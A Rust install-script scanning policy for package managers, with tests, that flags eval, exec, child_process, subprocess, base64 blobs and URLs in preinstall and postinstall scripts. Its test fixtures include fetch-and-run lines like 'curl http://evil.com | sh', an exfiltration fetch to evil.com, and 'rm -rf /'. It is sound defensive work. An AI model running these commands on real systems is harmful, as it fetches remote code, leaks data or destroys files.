use regex::Regex;

use super::{Policy, PolicyResult};
use crate::types::ScanContext;

/// Severity level for a detected pattern.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum Severity {
    /// Medium severity — generates a warning.
    Warn,
    /// High severity — blocks installation.
    Block,
}

/// A suspicious pattern to look for in install scripts.
struct Pattern {
    /// Human-readable name of the pattern.
    name: &'static str,
    /// The detection method for this pattern.
    detection: Detection,
    /// Severity level of the pattern.
    severity: Severity,
}

/// How a pattern is detected in script content.
enum Detection {
    /// Simple substring match using `.contains()`.
    Contains(&'static str),
    /// Regular expression match (compiled lazily).
    Regex(&'static str),
    /// Two-step base64 detection (L-4 fix):
    ///   1. Find all runs of 40+ chars from the base64 alphabet `[A-Za-z0-9+/=]`.
    ///   2. Accept only those runs that contain at least one base64-exclusive char
    ///      (`+`, `/`, or `=`), excluding pure-hex sequences (SHA-256 digests, git SHAs).
    Base64,
}

/// Policy that analyzes install scripts for suspicious patterns.
///
/// Scans preinstall, install, and postinstall scripts for known-malicious
/// patterns such as `eval(`, `child_process`, `subprocess`, obfuscated
/// base64 strings, and network access.
pub struct InstallScriptPolicy;

impl InstallScriptPolicy {
    /// Build the list of patterns to check against.
    fn patterns() -> Vec<Pattern> {
        vec![
            // Block patterns (high severity)
            Pattern {
                name: "eval",
                detection: Detection::Contains("eval("),
                severity: Severity::Block,
            },
            Pattern {
                name: "exec",
                detection: Detection::Contains("exec("),
                severity: Severity::Block,
            },
            Pattern {
                name: "child_process",
                detection: Detection::Contains("child_process"),
                severity: Severity::Block,
            },
            Pattern {
                name: "subprocess",
                detection: Detection::Contains("subprocess"),
                severity: Severity::Block,
            },
            Pattern {
                name: "os.system",
                detection: Detection::Contains("os.system"),
                severity: Severity::Block,
            },
            Pattern {
                name: "os.popen",
                detection: Detection::Contains("os.popen"),
                severity: Severity::Block,
            },
            Pattern {
                name: "Function constructor",
                detection: Detection::Contains("Function("),
                severity: Severity::Block,
            },
            // Warn patterns (medium severity)
            //
            // L-4 fix: Detection::Base64 uses a two-step match so that pure-hex
            // sequences (SHA-256 checksums, git SHAs — which use only [0-9a-fA-F])
            // are excluded. Step 1 finds any run of 40+ chars from the base64
            // alphabet [A-Za-z0-9+/=]. Step 2 accepts the run only if it contains
            // at least one base64-exclusive character (+, /, or =).
            Pattern {
                name: "base64 string",
                detection: Detection::Base64,
                severity: Severity::Warn,
            },
            Pattern {
                name: "http url",
                detection: Detection::Regex(r"https?://"),
                severity: Severity::Warn,
            },
            Pattern {
                name: "process.env",
                detection: Detection::Contains("process.env"),
                severity: Severity::Warn,
            },
            Pattern {
                name: "os.environ",
                detection: Detection::Contains("os.environ"),
                severity: Severity::Warn,
            },
        ]
    }

    /// Strip comments from script content before substring (Contains) matching.
    ///
    /// This is a best-effort, false-positive reduction step (L-3 fix). Removes:
    /// - Line comments starting with `//` (JavaScript/C style)
    /// - Line comments starting with `#` (shell/Python style)
    /// - Block comments delimited by `/*` and `*/` (non-greedy, may span lines)
    ///
    /// **Scope:** comment stripping is applied only when checking `Contains`
    /// patterns. `Regex` patterns (e.g. the http-url pattern matching `https?://`)
    /// run against the original content so that `://` sequences inside URLs are
    /// not inadvertently destroyed by the `//` stripping rule.
    ///
    /// The stripping operates on a copy of the content; the original is preserved
    /// for diagnostic messages. Over-stripping and under-stripping are both
    /// acceptable — this is a false-positive reduction measure, not a security gate.
    fn strip_comments(content: &str) -> String {
        // Pattern explanation:
        //   /\*[\s\S]*?\*/    — block comments (non-greedy, dot-all via [\s\S])
        //   //[^\n]*          — C/JS line comments to end of line
        //   #[^\n]*           — shell/Python line comments to end of line
        //
        // Note: the `regex` crate does not support lookbehind assertions, so we
        // cannot use (?<!:)// to spare :// in URLs. That is why this function is
        // scoped to Contains checks only (see evaluate()).
        static COMMENT_RE: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
        let re = COMMENT_RE.get_or_init(|| {
            Regex::new(r"/\*[\s\S]*?\*/|//[^\n]*|#[^\n]*")
                .expect("comment-stripping regex is valid")
        });
        re.replace_all(content, "").into_owned()
    }

    /// Two-step base64 detection (L-4 fix).
    ///
    /// Returns `true` if `content` contains a run of 40+ characters from the
    /// base64 alphabet `[A-Za-z0-9+/=]` that also contains at least one
    /// base64-exclusive character (`+`, `/`, or `=`).
    ///
    /// Pure-hex sequences (`[0-9a-fA-F]+`) such as SHA-256 digests and git SHAs
    /// are excluded because they contain no `+`, `/`, or `=`.
    fn has_base64_string(content: &str) -> bool {
        static BASE64_SPAN_RE: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
        let span_re = BASE64_SPAN_RE.get_or_init(|| {
            Regex::new(r"[A-Za-z0-9+/=]{40,}").expect("base64-span regex is valid")
        });
        span_re
            .find_iter(content)
            .any(|m| m.as_str().contains(['+', '/', '=']))
    }
}

impl Policy for InstallScriptPolicy {
    fn name(&self) -> &str {
        "install_scripts"
    }

    fn evaluate(&self, ctx: &ScanContext) -> PolicyResult {
        if ctx.install_scripts.is_empty() {
            return PolicyResult::Pass;
        }

        let patterns = Self::patterns();
        let mut worst_severity: Option<Severity> = None;
        let mut worst_message: Option<String> = None;

        for script in &ctx.install_scripts {
            // L-3 fix: strip comments from a working copy used only for Contains
            // checks. Regex patterns run against the original content so that
            // `://` sequences in URLs are not destroyed by the `//` stripping rule
            // (the `regex` crate does not support lookbehind assertions).
            // The original `script.content` is also used for diagnostic messages.
            let stripped_for_contains = Self::strip_comments(&script.content);

            for pattern in &patterns {
                let matched = match &pattern.detection {
                    Detection::Contains(needle) => stripped_for_contains.contains(needle),
                    Detection::Regex(re_str) => {
                        // Compile the regex — this is acceptable for a small number of patterns.
                        if let Ok(re) = Regex::new(re_str) {
                            re.is_match(&script.content)
                        } else {
                            false
                        }
                    }
                    Detection::Base64 => Self::has_base64_string(&script.content),
                };

                if matched {
                    let should_update = match worst_severity {
                        None => true,
                        Some(current) => pattern.severity > current,
                    };

                    if should_update {
                        worst_severity = Some(pattern.severity);
                        worst_message = Some(format!(
                            "Suspicious pattern '{}' found in '{}' script of package '{}'",
                            pattern.name, script.name, ctx.metadata.name
                        ));
                    }

                    // If we already found a Block, no need to check more patterns
                    // for this script (but we still check other scripts for reporting).
                    if pattern.severity == Severity::Block {
                        break;
                    }
                }
            }

            // Early exit if we've already found a Block
            if worst_severity == Some(Severity::Block) {
                break;
            }
        }

        match (worst_severity, worst_message) {
            (Some(Severity::Block), Some(msg)) => PolicyResult::Block(msg),
            (Some(Severity::Warn), Some(msg)) => PolicyResult::Warn(msg),
            _ => PolicyResult::Pass,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{InstallScript, PackageMetadata, ScanContext};

    /// Helper to create a ScanContext with the given install scripts.
    fn make_context(scripts: Vec<InstallScript>) -> ScanContext {
        let meta = PackageMetadata {
            name: "test-pkg".to_string(),
            version: "1.0.0".to_string(),
            description: None,
            published_at: None,
            maintainers: vec![],
            downloads: None,
            repository_url: None,
            content_hash: None,
        };
        ScanContext {
            metadata: meta,
            vulnerabilities: vec![],
            install_scripts: scripts,
            previous_maintainers: None,
            git_source: None,
            npm_attestations: None,
            npm_attestation_fetch_error: None,
            pypi_attestation: None,
            pypi_provenance_fetch_error: None,
            provenance_identity: None,
            go_sumdb_result: None,
        }
    }

    // T-051-16: All task 012 install-script tests that were passing before still pass.
    // Verified by running `cargo test install_script` — see individual T-012-XX tests below.
    //
    // T-051-18: `cargo test`, `cargo clippy --all-targets -- -D warnings`, and
    // `cargo fmt --check` all pass — verified in CI / pre-commit gate.

    // T-012-01: Clean script passes ("echo done")
    #[test]
    fn clean_script_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "echo done".to_string(),
        }]);

        assert_eq!(policy.evaluate(&ctx), PolicyResult::Pass);
    }

    // T-012-02: eval() in script blocks
    #[test]
    fn eval_in_script_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "eval(Buffer.from('bWFsaWNpb3Vz', 'base64').toString())".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Block(reason) => {
                assert!(
                    reason.contains("eval"),
                    "Block reason should mention 'eval', got: {reason}"
                );
            }
            other => panic!("Expected Block, got {:?}", other),
        }
    }

    // T-012-03: child_process require blocks
    #[test]
    fn child_process_require_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "preinstall".to_string(),
            content: "require('child_process').exec('curl http://evil.com | sh')".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "child_process should be blocked, got: {:?}",
            result
        );
    }

    // T-012-04: Base64 string above threshold warns
    #[test]
    fn base64_string_above_threshold_warns() {
        let policy = InstallScriptPolicy;
        // A 60-character base64 string
        let base64_payload = "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwYWJjZA==";
        assert!(base64_payload.len() >= 40);
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("var data = '{base64_payload}';"),
        }]);

        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Warn(reason) => {
                assert!(
                    reason.contains("base64"),
                    "Warn reason should mention 'base64', got: {reason}"
                );
            }
            other => panic!("Expected Warn, got {:?}", other),
        }
    }

    // T-012-05: HTTP URL in script warns
    #[test]
    fn http_url_in_script_warns() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "fetch('https://evil.com/exfil')".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Warn(reason) => {
                assert!(
                    reason.contains("http url"),
                    "Warn reason should mention 'http url', got: {reason}"
                );
            }
            other => panic!("Expected Warn, got {:?}", other),
        }
    }

    // T-012-06: subprocess in Python script blocks
    #[test]
    fn subprocess_in_python_script_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "import subprocess; subprocess.call(['rm', '-rf', '/'])".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "subprocess should be blocked, got: {:?}",
            result
        );
    }

    // T-012-07: No install scripts passes (empty Vec)
    #[test]
    fn no_install_scripts_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![]);

        assert_eq!(policy.evaluate(&ctx), PolicyResult::Pass);
    }

    // T-012-08: Multiple patterns — worst result wins
    #[test]
    fn multiple_patterns_worst_result_wins() {
        let policy = InstallScriptPolicy;
        // This script has both a warn pattern (https URL) and a block pattern (eval)
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "eval(require('https://evil.com/payload.js'))".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "Block should take precedence over Warn, got: {:?}",
            result
        );
    }

    // Additional test: os.system blocks
    #[test]
    fn os_system_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "install".to_string(),
            content: "os.system('curl http://evil.com | sh')".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "os.system should be blocked, got: {:?}",
            result
        );
    }

    // Additional test: process.env warns
    #[test]
    fn process_env_warns() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "console.log(process.env.HOME)".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Warn(_)),
            "process.env should warn, got: {:?}",
            result
        );
    }

    // Additional test: Function constructor blocks
    #[test]
    fn function_constructor_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "preinstall".to_string(),
            content: "new Function('return this')()".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "Function( should be blocked, got: {:?}",
            result
        );
    }

    // ── Task 051 tests ──────────────────────────────────────────────────────────

    // T-051-01: Function( in a // comment does not trigger Block
    #[test]
    fn t051_01_function_in_line_comment_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "// Function() is the constructor for…\nconsole.log('hello')".to_string(),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "Function( in // comment should not block"
        );
    }

    // T-051-02: Function( in a # comment does not trigger Block
    #[test]
    fn t051_02_function_in_hash_comment_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "# Function() is used internally\necho done".to_string(),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "Function( in # comment should not block"
        );
    }

    // T-051-03: Function( in a /* … */ block comment does not trigger Block
    #[test]
    fn t051_03_function_in_block_comment_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "/* Function() is the constructor\n   for dynamic code */\nconsole.log(1)"
                .to_string(),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "Function( in /* */ block comment should not block"
        );
    }

    // T-051-04: Function( in live code still triggers Block
    #[test]
    fn t051_04_function_in_live_code_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "var fn = new Function('return this')()".to_string(),
        }]);
        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Block(reason) => {
                assert!(
                    reason.contains("Function constructor"),
                    "Block reason should mention 'Function constructor', got: {reason}"
                );
            }
            other => panic!("Expected Block, got {:?}", other),
        }
    }

    // T-051-05: Function( in comment + live code — Block wins
    #[test]
    fn t051_05_function_comment_and_live_code_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "// Function() is benign\nnew Function('return this')()".to_string(),
        }]);
        assert!(
            matches!(policy.evaluate(&ctx), PolicyResult::Block(_)),
            "live-code Function( should still block even when comment has it too"
        );
    }

    // T-051-06: eval( in a // comment does not trigger Block
    #[test]
    fn t051_06_eval_in_line_comment_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "// eval(Buffer.from('x','base64').toString()) — example only\necho done"
                .to_string(),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "eval( in // comment should not block"
        );
    }

    // T-051-07: exec( after a # comment marker does not trigger Block
    #[test]
    fn t051_07_exec_in_hash_comment_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "# exec() removed for security\necho ok".to_string(),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "exec( in # comment should not block"
        );
    }

    // T-051-08: child_process in a /* */ block comment does not trigger Block
    #[test]
    fn t051_08_child_process_in_block_comment_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "/*\n * Calls child_process.exec\n */\nconsole.log('clean')".to_string(),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "child_process in /* */ block comment should not block"
        );
    }

    // T-051-09: 64-character hex string (SHA-256) does not trigger Warn
    #[test]
    fn t051_09_hex_sha256_does_not_warn() {
        let policy = InstallScriptPolicy;
        let hex_hash = "a3b1c2d4e5f607182930405060708090a1b2c3d4e5f607182930405060708090";
        assert_eq!(hex_hash.len(), 64, "fixture must be 64 chars");
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("sha256sum: {hex_hash}"),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "64-char hex SHA-256 should not warn as base64"
        );
    }

    // T-051-10: 40-character git SHA (hex) does not trigger Warn
    #[test]
    fn t051_10_git_sha_does_not_warn() {
        let policy = InstallScriptPolicy;
        let git_sha = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f80918";
        assert_eq!(git_sha.len(), 40, "fixture must be 40 chars");
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("git checkout {git_sha}"),
        }]);
        assert_eq!(
            policy.evaluate(&ctx),
            PolicyResult::Pass,
            "40-char git SHA should not warn as base64"
        );
    }

    // T-051-11: Genuine base64 payload with = padding triggers Warn
    #[test]
    fn t051_11_base64_with_equals_warns() {
        let policy = InstallScriptPolicy;
        // 60-char base64 string ending with ==
        let b64 = "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwYWJjZA==";
        assert!(b64.len() >= 40, "fixture must be >= 40 chars");
        assert!(b64.contains('='), "fixture must contain =");
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("var data = '{b64}'"),
        }]);
        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Warn(reason) => {
                assert!(
                    reason.contains("base64"),
                    "Warn reason should mention 'base64', got: {reason}"
                );
            }
            other => panic!("Expected Warn, got {:?}", other),
        }
    }

    // T-051-12: Genuine base64 payload containing / triggers Warn
    #[test]
    fn t051_12_base64_with_slash_warns() {
        let policy = InstallScriptPolicy;
        let b64 = "YWJjZGVmZ2hpamtsbW5vcHFy/3R1dnd4eXoxMjM0NTY3ODkw";
        assert!(b64.len() >= 40, "fixture must be >= 40 chars");
        assert!(b64.contains('/'), "fixture must contain /");
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("var data = '{b64}'"),
        }]);
        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Warn(reason) => {
                assert!(
                    reason.contains("base64"),
                    "Warn reason should mention 'base64', got: {reason}"
                );
            }
            other => panic!("Expected Warn, got {:?}", other),
        }
    }

    // T-051-13: Genuine base64 payload containing + triggers Warn
    #[test]
    fn t051_13_base64_with_plus_warns() {
        let policy = InstallScriptPolicy;
        let b64 = "YWJj+GVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkw";
        assert!(b64.len() >= 40, "fixture must be >= 40 chars");
        assert!(b64.contains('+'), "fixture must contain +");
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("var data = '{b64}'"),
        }]);
        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Warn(reason) => {
                assert!(
                    reason.contains("base64"),
                    "Warn reason should mention 'base64', got: {reason}"
                );
            }
            other => panic!("Expected Warn, got {:?}", other),
        }
    }

    // T-051-14: URL with base64-exclusive chars (= in query string) triggers Warn
    // (the http url pattern fires too; worst result is Warn since neither is Block)
    #[test]
    fn t051_14_url_with_base64_segment_warns() {
        let policy = InstallScriptPolicy;
        // The segment after q= has +, /, = and is >= 40 chars in total run
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "fetch('https://cdn.example.com/loader?q=abc+def/ghi/jkl=mno=pqr=stu=vwxyz0')"
                .to_string(),
        }]);
        // At minimum the http url pattern fires; the segment may also fire base64.
        // Either way the result must be Warn (not Block).
        assert!(
            matches!(policy.evaluate(&ctx), PolicyResult::Warn(_)),
            "URL with base64-like segment should produce Warn"
        );
    }

    // T-051-15: atob( with a >=40-char base64 payload (has + and /) triggers Warn
    #[test]
    fn t051_15_atob_with_base64_payload_warns() {
        let policy = InstallScriptPolicy;
        let b64 = "YWJj+GVmZ2hp/mtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3";
        assert!(b64.len() >= 40, "fixture must be >= 40 chars");
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("atob('{b64}')"),
        }]);
        assert!(
            matches!(policy.evaluate(&ctx), PolicyResult::Warn(_)),
            "atob with base64 payload should produce Warn"
        );
    }

    // T-051-17: T-012-02 fixture still triggers Block after comment stripping
    #[test]
    fn t051_17_eval_in_live_code_still_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "eval(Buffer.from('bWFsaWNpb3Vz', 'base64').toString())".to_string(),
        }]);
        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Block(reason) => {
                assert!(
                    reason.contains("eval"),
                    "Block reason should mention 'eval', got: {reason}"
                );
            }
            other => panic!("Expected Block, got {:?}", other),
        }
    }
}
